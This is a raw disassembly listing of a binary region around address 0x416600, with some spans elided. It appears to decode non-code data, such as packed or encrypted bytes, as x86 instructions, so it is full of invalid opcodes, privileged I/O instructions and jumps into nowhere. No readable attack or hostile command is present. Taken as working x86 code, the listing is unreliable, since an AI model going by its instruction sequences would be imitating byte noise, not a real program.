  416583:	nop
  416584:	les    ebp,FWORD PTR [esi+0x407cf30d]
  41658a:	fisub  DWORD PTR [eax+0x69450dde]
	...
  4165f4:	and    eax,0xfff32bd8
  4165f9:	repz std 
  4165fb:	fisub  WORD PTR [esi-0x4bb04354]
  416601:	sti    
  416602:	sbb    ch,BYTE PTR [edi]
  416604:	inc    esp
  416605:	in     al,dx
  416606:	add    BYTE PTR [eax],al
  416608:	add    al,0x1
  41660a:	add    BYTE PTR [eax],al
  41660c:	mov    dl,0x58
  41660e:	cdq    
  41660f:	or     al,0xe2
  416611:	outs   dx,BYTE PTR ds:[esi]
  416612:	dec    edx
  416613:	add    bl,bl
  416615:	sbb    edx,DWORD PTR [esi-0x73]
  416618:	xlat   BYTE PTR ds:[ebx]
  416619:	inc    ecx
  41661a:	ds push ebp
  41661c:	cmc    
  41661d:	ret    0x97ec
  416620:	mov    DWORD PTR [edi+edi*4+0x1ee46a7],eax
  416627:	xchg   ebp,eax
  416628:	jle    0x41661d
  41662a:	loopne 0x416691
  41662c:	outs   dx,BYTE PTR ds:[esi]
  41662d:	xchg   edx,eax
  41662e:	(bad)  
  416630:	jno    0x4165c0
  416632:	mov    ch,0x15
  416634:	test   BYTE PTR [eax+eax*2+0x313c6c3f],bl
  41663b:	xor    ch,BYTE PTR [ecx+eax*8+0x12]
  41663f:	gs xor ax,0x9734
  416644:	out    0x3d,eax
  416646:	and    al,0xae
  416648:	(bad)  
  416649:	xchg   esp,eax
  41664a:	loopne 0x4166a9
  41664c:	or     eax,0xf28aa1b0
  416651:	test   eax,0x91ff94d
  416656:	outs   dx,BYTE PTR ds:[esi]
  416657:	fld    QWORD PTR [ebx]
  416659:	adc    edi,DWORD PTR [ebp-0x788823fa]
  41665f:	(bad)  [esi+edx*4+0xc]
  416663:	dec    DWORD PTR [edi+0xe16c4cc]
  416669:	push   ss
  41666a:	dec    eax
  41666b:	mov    ch,0xdf
  41666d:	scas   al,BYTE PTR es:[edi]
  41666e:	(bad)  
  416670:	sbb    esp,DWORD PTR ds:0xed23c1e9
  416676:	(bad)  
  416677:	enter  0x3d36,0xa5
  41667b:	xor    bh,BYTE PTR [edx-0x3e]
  41667e:	jb     0x416640
  416680:	mov    bl,0x2
  416682:	sbb    esp,DWORD PTR [edi]
  416684:	xchg   ebp,eax
  416685:	mov    dl,0x68
  416687:	test   al,0xf4
  416689:	xchg   esi,eax
  41668a:	adc    al,0xe7
  41668c:	ins    DWORD PTR es:[edi],dx
  41668d:	pop    esp
  41668e:	adc    dl,BYTE PTR [eax+0x1b]
  416691:	fidiv  WORD PTR [eax+0x2f]
  416694:	test   al,0xf4
  416696:	jae    0x4166de
  416698:	fist   WORD PTR [esi]
  41669a:	aad    0x30
  41669c:	xor    BYTE PTR [ecx+0x5e],ah
  41669f:	js     0x41662f
  4166a1:	cli    
  4166a2:	sbb    ah,ch
  4166a4:	add    eax,0x80ecb8a8
  4166a9:	xor    BYTE PTR [ebx-0x29494919],bh
  4166af:	outs   dx,BYTE PTR ds:[esi]
  4166b0:	push   edi
  4166b1:	ins    DWORD PTR es:[edi],dx
  4166b2:	push   esp
  4166b3:	mov    ds:0x78d6d037,al
  4166b8:	dec    ecx
  4166b9:	and    al,0x30
  4166bb:	jne    0x416657
  4166bd:	jl     0x41671f
  4166bf:	push   es
  4166c0:	data16 daa 
  4166c2:	arpl   WORD PTR [ecx-0x334e7aab],bp
  4166c8:	or     BYTE PTR gs:[ebp-0x14e8fa47],cl
  4166cf:	sbb    al,BYTE PTR [edx]
  4166d1:	ins    DWORD PTR es:[edi],dx
  4166d2:	add    dl,BYTE PTR [esp+ecx*4-0x73dfdd6f]
  4166d9:	mov    dh,0x92
  4166db:	mov    al,ds:0x61059cfe
  4166e0:	dec    ebp
  4166e1:	add    BYTE PTR [eax-0x27657a21],dl
  4166e7:	inc    esi
  4166e8:	cwde   
  4166e9:	sub    eax,0x146ee42f
  4166ee:	shr    edx,0xd3
  4166f1:	pop    ds
  4166f2:	(bad)
  4166f5:	repz pop esi
  4166f7:	stos   BYTE PTR es:[edi],al
  4166f8:	test   eax,0xf7a0db9c
  4166fd:	dec    eax
  4166fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166ff:	push   ss
  416700:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416701:	or     al,0xdf
  416703:	push   ds
  416704:	push   0xffffffb9
  416706:	outs   dx,DWORD PTR ds:[esi]
  416707:	scas   al,BYTE PTR es:[edi]
  416708:	xchg   edx,eax
  416709:	pop    edx
  41670a:	sub    DWORD PTR [esi],eax
  41670c:	mov    ch,0xd2
  41670e:	retf   
  41670f:	aas    
	...
  416774:	(bad)  
  416775:	(bad)  
  416777:	(bad)  
  416778:	(bad)  
  41677a:	out    0xff,eax
  41677c:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  416780:	in     eax,0x51
  416782:	rcl    BYTE PTR [edx+0x48],0xed
  416786:	add    BYTE PTR [eax],al
  416788:	add    al,0x1
  41678a:	add    BYTE PTR [eax],al
  41678c:	in     eax,0x8b
  41678e:	or     dh,BYTE PTR [edx-0x3e6c51a1]
  416794:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416795:	inc    edi
  416796:	aas    
  416797:	cmp    eax,0x910099c8
  41679c:	fisubr DWORD PTR [esi-0x3a]
  41679f:	pop    ss
  4167a0:	jae    0x4167c8
  4167a2:	or     al,dl
  4167a4:	sti    
  4167a5:	mov    WORD PTR [esi+0x75],ss
  4167a8:	int    0xd3
  4167aa:	sbb    eax,0xca9c2d14
  4167af:	or     ecx,0x4c6a46d6
  4167b5:	dec    edx
  4167b6:	xor    BYTE PTR [edx],dh
  4167b8:	mov    ebp,DWORD PTR [eax+0x12]
  4167bb:	xor    DWORD PTR [eax-0x5f6792b5],0xf
  4167c2:	stc    
  4167c3:	gs jecxz 0x41675f
  4167c6:	int3   
  4167c7:	and    DWORD PTR [edx-0x2037107f],ecx
  4167cd:	fs mov esi,0x5f8d2c51
  4167d3:	rol    DWORD PTR [ecx+0xd],1
  4167d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167d7:	jge    0x4167dd
  4167d9:	data16 js 0x416801
  4167dc:	imul   ebp,edi,0xd930b77d
  4167e2:	scas   eax,DWORD PTR es:[edi]
  4167e3:	xchg   ecx,eax
  4167e4:	pop    es
  4167e5:	or     DWORD PTR [esi+0x2141a390],ebp
  4167eb:	mov    dl,0x37
  4167ed:	imul   ecx,ebx,0xffffffc9
  4167f0:	clc    
  4167f1:	fwait
  4167f2:	jge    0x416822
  4167f4:	mov    ds:0x614a4f9c,eax
  4167f9:	sbb    ebx,DWORD PTR [eax+0x56145b41]
  4167ff:	into   
  416800:	sbb    DWORD PTR [edi],ebx
  416802:	mov    al,ds:0xfb8d2fa6
  416807:	scas   al,BYTE PTR es:[edi]
  416808:	push   ebp
  416809:	ins    BYTE PTR es:[edi],dx
  41680a:	xchg   edx,eax
  41680b:	test   DWORD PTR [esi+0x72660795],edx
  416811:	icebp  
  416812:	gs xchg ah,cl
  416815:	retf   0x6c0e
  416818:	dec    ecx
  416819:	push   0xffffffad
  41681b:	loopne 0x4167a2
  41681d:	sub    eax,0x93a17579
  416822:	jb     0x416829
  416824:	in     al,dx
  416825:	loopne 0x416838
  416827:	adc    al,BYTE PTR [ebp+ecx*8-0x157b32f1]
  41682e:	xor    eax,0xf65671f5
  416833:	or     eax,0x789e87d2
  416838:	test   BYTE PTR [eax+edi*4],0xb7
  41683c:	xchg   ebx,eax
  41683d:	frstor [edx]
  41683f:	sar    BYTE PTR [esi+0x2b],1
  416842:	push   ecx
  416843:	(bad)  
  416844:	outs   dx,DWORD PTR ds:[esi]
  416845:	out    0xc1,eax
  416847:	lea    ecx,[esi]
  416849:	mov    ebx,0x151345e9
  41684e:	jne    0x416860
  416850:	and    eax,0x590edb7a
  416855:	es int 0x44
  416858:	inc    esp
  416859:	scas   al,BYTE PTR es:[edi]
  41685a:	popa   
  41685b:	ret    0xa101
  41685e:	pusha  
  41685f:	lods   eax,DWORD PTR ds:[esi]
  416860:	sub    eax,0x2fb11f4c
  416865:	cmp    DWORD PTR [edx-0x2f47420c],edx
  41686b:	pop    esp
  41686c:	loop   0x41683e
  41686e:	jae    0x41680c
  416870:	xor    ch,BYTE PTR [ebx]
  416872:	fdivr  QWORD PTR [edx-0x34]
  416875:	arpl   bx,dx
  416877:	je     0x416826
  416879:	in     al,dx
  41687a:	pusha  
  41687b:	aad    0xf1
  41687d:	pop    ebx
  41687e:	push   ebp
  41687f:	mov    bl,0x81
  416881:	repnz dec eax
  416883:	adc    BYTE PTR [edx],ch
  416885:	aad    0x53
  416887:	jnp    0x47674e5f
  41688d:	call   0x417449
	...
  4168f2:	add    BYTE PTR [eax],al
  4168f4:	shr    DWORD PTR [edi-0x4810cfa],1
  4168fa:	cmc    
  4168fb:	scas   eax,DWORD PTR es:[edi]
  4168fc:	sub    DWORD PTR [edi-0x5d],edi
  4168ff:	mov    ebp,0x945d9e5b
  416904:	dec    esp
  416905:	out    dx,al
  416906:	add    BYTE PTR [eax],al
  416908:	add    al,0x1
  41690a:	add    BYTE PTR [eax],al
  41690c:	pop    esp
  41690d:	jo     0x416976
  41690f:	and    ah,BYTE PTR [eax]
  416911:	mov    cl,0x8e
  416913:	outs   dx,BYTE PTR ds:[esi]
  416914:	jecxz  0x41690c
  416916:	pushf  
  416917:	fdivp  st(0),st
  416919:	test   al,0x1e
  41691b:	scas   al,BYTE PTR es:[edi]
  41691c:	enter  0xfe69,0xd6
  416920:	icebp  
  416921:	mov    esi,0x8fe7c9aa
  416926:	xor    DWORD PTR [edi+0x1aa2e1b9],esi
  41692c:	mov    ds:0x2f3a17cb,eax
  416931:	mov    ebx,0xb6c401ae
  416936:	jl     0x4168d5
  416938:	xor    ah,dh
  41693a:	aaa    
  41693b:	repz xor bl,BYTE PTR [edx]
  41693e:	add    al,bl
  416940:	mov    al,0x1f
  416942:	ins    DWORD PTR es:[edi],dx
  416943:	test   DWORD PTR [eax-0x2dcdbd9d],esp
  416949:	ja     0x416915
  41694b:	ins    BYTE PTR es:[edi],dx
  41694c:	xchg   ebx,eax
  41694d:	and    eax,0xb4b97818
  416952:	push   ds
  416953:	push   edi
  416954:	rcr    BYTE PTR [ebp+0x274924a4],0x68
  41695b:	fwait
  41695c:	ror    DWORD PTR [eax-0x21],0xd3
  416960:	cld    
  416961:	jbe    0x41694a
  416963:	(bad)  
  416964:	fld    DWORD PTR [edx+0x71569b7a]
  41696a:	jns    0x416923
  41696c:	push   cs
  41696d:	pop    eax
  41696e:	out    dx,eax
  41696f:	inc    edx
  416970:	test   al,0xe1
  416972:	test   DWORD PTR [ebx-0x19],esp
  416975:	jmp    0x8c76b19d
  41697a:	(bad)  
  41697b:	cmp    bh,BYTE PTR [edx]
  41697d:	mov    edi,0x1f71ff0c
  416982:	sub    al,0x4f
  416984:	(bad)  
  416985:	cmp    dh,BYTE PTR [eax+0x4]
  416988:	sti    
  416989:	in     eax,dx
  41698a:	xchg   ecx,eax
  41698b:	jg     0x416942
  41698d:	and    esp,DWORD PTR [ebx+edi*8]
  416990:	addr16 dec ecx
  416992:	pop    esi
  416993:	push   0xfffffff5
  416995:	retf   
  416996:	xchg   ecx,eax
  416997:	or     al,0x81
  416999:	clc    
  41699a:	pop    esi
  41699b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41699c:	pop    es
  41699d:	rol    BYTE PTR [eax+0x4d9b9560],0x3d
  4169a4:	push   ds
  4169a5:	stos   BYTE PTR es:[edi],al
  4169a6:	or     eax,0x38dc7bf2
  4169ab:	sub    DWORD PTR [ebp+0x60],ebx
  4169ae:	xchg   DWORD PTR [edx],ebp
  4169b0:	adc    dh,BYTE PTR ds:0xa1429815
  4169b6:	ds aam 0x29
  4169b9:	cmc    
  4169ba:	dec    eax
  4169bb:	pop    ebx
  4169bc:	sub    ah,bl
  4169be:	adc    eax,0x5f163436
  4169c3:	call   0x4354:0x53c2bb42
  4169ca:	adc    edx,DWORD PTR [edi+edx*1+0x4c]
  4169ce:	and    al,0xf3
  4169d0:	add    eax,0x10c507c4
  4169d5:	(bad)  
  4169d6:	jmp    0x4169c2
  4169d8:	imul   esp,ebp,0xfbd7f9cc
  4169de:	jmp    0x4169c3
  4169e0:	test   al,0x26
  4169e2:	xchg   esi,eax
  4169e3:	push   ds
  4169e4:	jns    0x4169dd
  4169e6:	test   al,0x1d
  4169e8:	xor    ebx,ecx
  4169ea:	adc    al,0x3d
  4169ec:	pop    esp
  4169ed:	pop    ecx
  4169ee:	dec    edi
  4169ef:	dec    ebp
  4169f0:	push   0xffffff94
  4169f2:	aad    0x69
  4169f4:	fdiv   QWORD PTR [edi+0x3b]
  4169f7:	xchg   edi,eax
  4169f8:	mov    al,ds:0x5301cdc5
  4169fd:	and    eax,0xc56dfd19
  416a02:	jmp    0x4169fc
  416a04:	jb     0x41698f
  416a06:	and    DWORD PTR [eax+ebx*2+0x21a4645b],0x9358be
	...
  416a71:	add    BYTE PTR [eax],al
  416a73:	add    bl,cl
  416a75:	pusha  
  416a76:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a7d:	mov    al,ds:0x50130ba3
  416a82:	and    al,0xf1
  416a84:	push   eax
  416a85:	out    dx,eax
  416a86:	add    BYTE PTR [eax],al
  416a88:	add    al,0x1
  416a8a:	add    BYTE PTR [eax],al
  416a8c:	pop    ecx
  416a8d:	and    edi,eax
  416a8f:	push   es
  416a90:	or     edi,DWORD PTR [esi-0x483f45ae]
  416a96:	ret    0xb36f
  416a99:	call   0x2192:0x24547055
  416aa0:	loop   0x416a6d
  416aa2:	loopne 0x416a3a
  416aa4:	lods   al,BYTE PTR ds:[esi]
  416aa5:	imul   edi,DWORD PTR [esi-0x62],0x4b
  416aa9:	enter  0x16fe,0xe4
  416aad:	xchg   DWORD PTR [ecx-0xce1c7ef],edi
  416ab3:	add    al,0xa4
  416ab5:	into   
  416ab6:	xlat   BYTE PTR ds:[ebx]
  416ab7:	pop    ecx
  416ab8:	pop    edx
  416ab9:	pop    ebx
  416aba:	push   ds
  416abb:	sub    al,0xe9
  416abd:	mov    bh,BYTE PTR [ebp+0x2e]
  416ac0:	test   al,0x59
  416ac2:	mov    cs,eax
  416ac4:	mov    ds:0x4e96c8a4,eax
  416ac9:	test   DWORD PTR [ebx+0x24d7ce4b],esp
  416acf:	add    eax,0x5eba5770
  416ad4:	ins    DWORD PTR es:[edi],dx
  416ad5:	xchg   edi,eax
  416ad6:	sub    BYTE PTR [edx-0x43aaa241],0xf
  416add:	mov    ch,ah
  416adf:	add    ebx,DWORD PTR [edx+0x51]
  416ae2:	jo     0x416a76
  416ae4:	jmp    0xb3a9e823
  416ae9:	xchg   ebp,eax
  416aea:	ins    BYTE PTR es:[edi],dx
  416aeb:	fistp  QWORD PTR [eax+0x517a552d]
  416af1:	adc    al,dh
  416af3:	push   ebp
  416af4:	pop    edx
  416af5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416af6:	icebp  
  416af7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416af8:	sbb    al,0x75
  416afa:	mov    ah,0xba
  416afc:	xlat   BYTE PTR ds:[ebx]
  416afd:	or     ch,ah
  416aff:	mov    bh,0xd9
  416b01:	hlt    
  416b02:	dec    ecx
  416b03:	jl     0x416b6d
  416b05:	adc    BYTE PTR [edx-0x40],cl
  416b08:	inc    ebx
  416b09:	icebp  
  416b0a:	jge    0x416ab8
  416b0c:	cli    
  416b0d:	mov    cl,dh
  416b0f:	les    esi,FWORD PTR [ebp+eiz*8-0xc]
  416b13:	popf   
  416b14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b15:	nop
  416b16:	sbb    DWORD PTR [esi-0x5c],esi
  416b19:	and    al,0xd3
  416b1b:	push   ds
  416b1c:	push   ebx
  416b1d:	test   bh,al
  416b1f:	or     ecx,edi
  416b21:	pushf  
  416b22:	test   al,0x13
  416b24:	or     BYTE PTR [ecx-0x37b3a7e],0x1c
  416b2b:	dec    esi
  416b2c:	ret    0xcee3
  416b2f:	pop    edi
  416b30:	mov    edi,0x92b47269
  416b35:	jg     0x416b34
  416b37:	lods   eax,DWORD PTR ds:[esi]
  416b38:	add    DWORD PTR [edi+0x7077b21f],0x7c061f0a
  416b42:	fs cmp al,0xb7
  416b45:	xor    bl,BYTE PTR [esi+0x24695392]
  416b4b:	inc    ecx
  416b4c:	mov    dh,0xf9
  416b4e:	fld    TBYTE PTR [eax-0x4e085755]
  416b54:	mov    al,ds:0xdc15f3a
  416b59:	sub    ax,0x735c
  416b5d:	pusha  
  416b5e:	mov    eax,DWORD PTR [edx]
  416b60:	(bad)  [esi]
  416b62:	push   0xffffff9b
  416b64:	ja     0x416b44
  416b66:	aad    0x34
  416b68:	xor    ebp,ecx
  416b6a:	jmp    0x9fc0:0xfd19536e
  416b71:	push   ss
  416b72:	stos   DWORD PTR es:[edi],eax
  416b73:	inc    edx
  416b74:	jmp    0x416b15
  416b76:	mov    al,ds:0xd0e6bd62
  416b7b:	and    DWORD PTR [eax-0x7f96d783],edx
  416b81:	or     BYTE PTR ds:0x372c7a87,dl
  416b87:	std    
  416b88:	jbe    0x416bf8
  416b8a:	dec    ecx
  416b8b:	in     eax,0x9
  416b8d:	(bad)  
  416b8e:	sti    
  416b8f:	and    DWORD PTR [eax],eax
	...
  416bf1:	add    BYTE PTR [eax],al
  416bf3:	add    bl,ah
  416bf5:	gs push cs
  416bf7:	test   DWORD PTR [esi-0x38a0401],0x675b70a9
  416c01:	mov    ds:0xf0543598,al
  416c06:	add    BYTE PTR [eax],al
  416c08:	add    al,0x1
  416c0a:	add    BYTE PTR [eax],al
  416c0c:	leave  
  416c0d:	js     0x416c13
  416c0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c10:	push   ss
  416c11:	inc    esi
  416c12:	gs cdq 
  416c14:	xchg   BYTE PTR [edi],dh
  416c16:	and    al,0x3
  416c18:	mov    ds:0x6ceb39f2,al
  416c1d:	(bad)  
  416c1e:	sbb    eax,0x40677ae6
  416c23:	jge    0x416c36
  416c25:	and    eax,0x396d76f
  416c2a:	jns    0x416c58
  416c2c:	loope  0x416cad
  416c2e:	test   BYTE PTR [ebp-0x7a],dh
  416c31:	shl    ebx,cl
  416c33:	pop    eax
  416c34:	sbb    eax,0x6171e02d
  416c39:	xchg   edi,eax
  416c3a:	(bad)  
  416c3b:	aas    
  416c3c:	retf   
  416c3d:	test   eax,0x81c70fdc
  416c42:	pop    edi
  416c43:	aam    0xca
  416c45:	sub    BYTE PTR [ecx+0x10],0x35
  416c49:	sub    bl,BYTE PTR [eax-0x80]
  416c4c:	hlt    
  416c4d:	mov    ds:0xa1bb1a75,eax
  416c52:	dec    edi
  416c53:	xchg   ebp,eax
  416c54:	sub    cl,BYTE PTR [edx+0x3c]
  416c57:	add    esi,esp
  416c59:	xchg   edi,eax
  416c5a:	lea    eax,[ebx+0x24]
  416c5d:	icebp  
  416c5e:	jae    0x416c87
  416c60:	or     BYTE PTR [edx],ah
  416c62:	pop    ecx
  416c63:	nop
  416c64:	mov    esp,0x3fd8eed1
  416c69:	sub    al,BYTE PTR [ebx-0x57]
  416c6c:	xchg   esi,eax
  416c6d:	xchg   al,ch
  416c6f:	mov    eax,0xbbdb47d9
  416c74:	in     eax,0xa3
  416c76:	dec    ecx
  416c77:	push   esi
  416c78:	in     al,0xaf
  416c7a:	shld   DWORD PTR [ebp-0x71],eax,cl
  416c7e:	xor    eax,ebx
  416c80:	imul   BYTE PTR [ebp-0x2c]
  416c83:	and    edi,DWORD PTR [ecx]
  416c85:	call   0xfe3443ad
  416c8a:	mov    eax,ds:0x200ecd95
  416c8f:	inc    ebp
  416c90:	fs clc 
  416c92:	js     0x416d04
  416c94:	call   DWORD PTR [ebx+0x59]
  416c97:	inc    eax
  416c98:	xchg   ebp,eax
  416c99:	sbb    al,0x74
  416c9b:	(bad)  
  416c9c:	lock sar DWORD PTR gs:[ebp+0x4be93d23],cl
  416ca4:	sub    al,BYTE PTR [ecx+edi*8-0x63]
  416ca8:	cmp    al,dl
  416caa:	fsub   st,st(2)
  416cac:	jl     0x416cb8
  416cae:	and    ch,dl
  416cb0:	fisttp WORD PTR [eax+0x453b0f67]
  416cb6:	mov    bl,0x6b
  416cb8:	sub    DWORD PTR [eax+eax*2-0x66befa6d],0x11
  416cc0:	stos   BYTE PTR es:[edi],al
  416cc1:	leave  
  416cc2:	retf   0xaf57
  416cc5:	sbb    DWORD PTR [edi+esi*1],eax
  416cc8:	sti    
  416cc9:	mov    ebp,DWORD PTR [ebx+ebp*2]
  416ccc:	pop    esp
  416ccd:	jbe    0x416ccd
  416ccf:	mov    ebp,0x5d39abf5
  416cd4:	pop    ecx
  416cd5:	std    
  416cd6:	loop   0x416c7a
  416cd8:	cmp    cl,BYTE PTR [esp+eiz*2-0x71448c50]
  416cdf:	mov    dl,0x0
  416ce1:	outs   dx,DWORD PTR ds:[esi]
  416ce2:	mov    dh,BYTE PTR [ebp+0x48]
  416ce5:	pop    ebx
  416ce6:	jp     0x416ca6
  416ce8:	dec    esp
  416ce9:	push   0x9c8fd03f
  416cee:	std    
  416cef:	sub    esi,DWORD PTR [esi+0x75]
  416cf2:	push   ecx
  416cf3:	int3   
  416cf4:	sub    ecx,DWORD PTR [ebp+ecx*1-0x7d]
  416cf8:	dec    esi
  416cf9:	pop    ebx
  416cfa:	mov    ch,0x3b
  416cfc:	lods   al,BYTE PTR ds:[esi]
  416cfd:	xor    bl,BYTE PTR [ebp-0x7c]
  416d00:	scas   eax,DWORD PTR es:[edi]
  416d01:	adc    ah,ah
  416d03:	sub    BYTE PTR [ebp-0x3e],bh
  416d06:	js     0x416cb5
  416d08:	test   BYTE PTR [ecx],bh
  416d0a:	test   DWORD PTR [eax-0x68],ebx
  416d0d:	nop
  416d0e:	mov    bl,0x45
	...
  416d74:	and    DWORD PTR [ebx-0x40445077],edx
  416d7a:	daa    
  416d7b:	lahf   
  416d7c:	mov    ch,0x99
  416d7e:	pop    edx
  416d7f:	das    
  416d80:	cmp    al,0x66
  416d82:	je     0x416df2
  416d84:	pop    eax
  416d85:	icebp  
  416d86:	add    BYTE PTR [eax],al
  416d88:	add    al,0x1
  416d8a:	add    BYTE PTR [eax],al
  416d8c:	sbb    BYTE PTR [esi+0x1f364588],dh
  416d92:	pop    ss
  416d93:	add    al,0xe5
  416d95:	js     0x416da5
  416d97:	jae    0x416daf
  416d99:	loopne 0x416e10
  416d9b:	cmp    bl,BYTE PTR [edi-0x3a]
  416d9e:	jno    0x416df7
  416da0:	aaa    
  416da1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416da2:	add    BYTE PTR [eax+0x5e0532f9],cl
  416da8:	shl    BYTE PTR [ebx-0x17],0x1
  416dac:	and    DWORD PTR [edi+ebp*8-0xd],esp
  416db0:	xchg   ebx,eax
  416db1:	push   edi
  416db2:	(bad)  
  416db3:	ffree  st(6)
  416db5:	enter  0xa2dc,0xc3
  416db9:	mov    eax,0xacae5bdc
  416dbe:	sbb    al,0x41
  416dc0:	mov    fs,esp
  416dc2:	mov    eax,0x2cbd5d13
  416dc7:	jmp    0x6ec1:0x4cba49f
  416dce:	sbb    DWORD PTR [edx+ebp*8],ebx
  416dd1:	xor    dl,BYTE PTR [eax+0x719dbd0f]
  416dd7:	mov    esp,0x3059588c
  416ddc:	mov    al,ds:0x3726d1b8
  416de1:	enter  0xab21,0x75
  416de5:	push   edi
  416de6:	test   eax,0x24c213d5
  416deb:	cmp    DWORD PTR [ebx+0x4c1c624b],edi
  416df1:	xor    ebx,edi
  416df3:	jge    0x416e08
  416df5:	push   eax
  416df6:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  416df8:	gs pop ebx
  416dfa:	lds    esi,FWORD PTR [eax]
  416dfc:	inc    ecx
  416dfd:	or     ebp,ecx
  416dff:	fiadd  DWORD PTR [eax+esi*4]
  416e02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e03:	add    al,0xf8
  416e05:	xchg   esp,eax
  416e06:	out    dx,al
  416e07:	xor    al,0x8d
  416e09:	gs jae 0x416def
  416e0c:	fwait
  416e0d:	mov    eax,ds:0x40d1a7fe
  416e12:	cmc    
  416e13:	or     al,0x22
  416e15:	pop    edx
  416e16:	xchg   edx,eax
  416e17:	xor    ah,BYTE PTR [edi-0x44]
  416e1a:	and    cl,al
  416e1c:	aaa    
  416e1d:	sahf   
  416e1e:	bound  esi,QWORD PTR [eax-0x4d]
  416e21:	adc    BYTE PTR [eax],cl
  416e23:	daa    
  416e24:	ins    BYTE PTR es:[edi],dx
  416e25:	fistp  WORD PTR [edi]
  416e27:	fsub   st(5),st
  416e29:	(bad)  
  416e2a:	sti    
  416e2b:	inc    esp
  416e2c:	int    0x56
  416e2e:	inc    BYTE PTR [edx]
  416e30:	pop    ecx
  416e31:	repnz pop esi
  416e33:	sbb    eax,DWORD PTR [eax-0x70]
  416e36:	add    bh,al
  416e38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e39:	int    0xee
  416e3b:	repnz ins DWORD PTR es:[edi],dx
  416e3d:	loopne 0x416dc3
  416e3f:	pop    esp
  416e40:	cmp    DWORD PTR [esi-0x30c0c70f],0xffffff9a
  416e47:	mov    WORD PTR [ecx],ss
  416e49:	cwde   
  416e4a:	(bad)  
  416e4b:	lea    ecx,[edi+0x2f2d3994]
  416e51:	iret   
  416e52:	push   ss
  416e53:	out    dx,al
  416e54:	pop    ebp
  416e55:	xchg   edi,eax
  416e56:	xchg   edi,eax
  416e57:	inc    edi
  416e58:	in     al,0x72
  416e5a:	(bad)  
  416e5b:	mov    ebx,DWORD PTR [esi-0x1b]
  416e5e:	ja     0x416e29
  416e60:	jp     0x416e57
  416e62:	push   edi
  416e63:	ins    BYTE PTR es:[edi],dx
  416e64:	xchg   ebx,eax
  416e65:	ret    0xbe7a
  416e68:	mov    DWORD PTR [eax+0x1c],eax
  416e6b:	mov    bl,BYTE PTR [ebp+0x62]
  416e6e:	test   eax,0x1e004afb
  416e73:	jmp    0x416e21
  416e75:	jae    0x416e8b
  416e77:	dec    esp
  416e78:	popf   
  416e79:	pushf  
  416e7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e7b:	fld    DWORD PTR [ebx]
  416e7d:	cld    
  416e7e:	das    
  416e7f:	push   esi
  416e80:	sub    al,BYTE PTR [edi-0x850aa57]
  416e86:	sub    esp,DWORD PTR [bx-0x65]
  416e8a:	push   ecx
  416e8b:	inc    esp
  416e8c:	jl     0x416eed
  416e8e:	sbb    BYTE PTR [ecx+0x0],ah
	...
  416ef1:	add    BYTE PTR [eax],al
  416ef3:	add    BYTE PTR [edi-0x519271e7],bh
  416ef9:	(bad)  
  416efa:	(bad)  
  416efb:	fucomi st,st(0)
  416efd:	xor    eax,0x3edf8eea
  416f02:	and    eax,0xf25cfc
  416f07:	add    BYTE PTR [ecx+eax*1],al
  416f0a:	add    BYTE PTR [eax],al
  416f0c:	jp     0x416e98
  416f0e:	and    eax,0xcdb682db
  416f13:	ror    DWORD PTR [ecx+0x4d],cl
  416f16:	mov    ds:0x61ef2e1c,ax
  416f1c:	repz aaa 
  416f1e:	sub    edi,ecx
  416f20:	sbb    BYTE PTR [esi+0x8],bl
  416f23:	pop    ebx
  416f24:	jae    0x416f97
  416f26:	push   0x92c46bff
  416f2b:	push   cs
  416f2c:	and    al,dh
  416f2e:	sub    BYTE PTR [esi-0x37],cl
  416f31:	sbb    ah,BYTE PTR [edx+edx*2]
  416f34:	data16 jecxz 0x416fac
  416f37:	pushf  
  416f38:	jns    0x416ec1
  416f3a:	pop    ebp
  416f3b:	mov    edi,0x32893f34
  416f40:	xor    eax,0x846cfada
  416f45:	jmp    0xd2900ec4
  416f4a:	mov    esi,0x95929327
  416f4f:	imul   esi,ebx,0x31689c58
  416f55:	jp     0x416f89
  416f57:	add    edi,ebx
  416f59:	lds    ecx,FWORD PTR [ebx+0x2e]
  416f5c:	inc    ecx
  416f5d:	je     0x416f2f
  416f5f:	icebp  
  416f60:	aaa    
  416f61:	cwde   
  416f62:	fimul  DWORD PTR ds:0xae55c697
  416f68:	jae    0x416fd6
  416f6a:	fadd   QWORD PTR [eax+0x58e1f015]
  416f70:	cmp    BYTE PTR [ebp+0x2d8b68da],dh
  416f76:	test   BYTE PTR [esi],bl
  416f78:	sub    DWORD PTR [edi+0x1017f45b],ebx
  416f7e:	jg     0x416f2a
  416f80:	lea    esp,[esi-0x4dc96b50]
  416f86:	xchg   ebp,eax
  416f87:	mov    ebx,0x374ea27c
  416f8c:	(bad)  
  416f8d:	jmp    0x417007
  416f8f:	scas   al,BYTE PTR es:[edi]
  416f90:	das    
  416f91:	jge    0x416f67
  416f93:	fldl2e 
  416f95:	jmp    0x404f3536
  416f9a:	dec    edx
  416f9b:	jg     0x41700d
  416f9d:	pop    esp
  416f9e:	dec    ebx
  416f9f:	or     al,0x85
  416fa1:	xor    eax,0xd0714c0a
  416fa6:	retf   
  416fa7:	imul   esi,DWORD PTR [esi+ebx*4+0x2b2d1c7b],0x21
  416faf:	pop    ebx
  416fb0:	pop    esp
  416fb1:	adc    al,0x6b
  416fb3:	data16 rcl dh,0xcf
  416fb7:	mov    edi,ebx
  416fb9:	hlt    
  416fba:	hlt    
  416fbb:	push   esi
  416fbc:	jge    0x417021
  416fbe:	mov    esi,ebx
  416fc0:	imul   edi,DWORD PTR [edi],0xaab66f8b
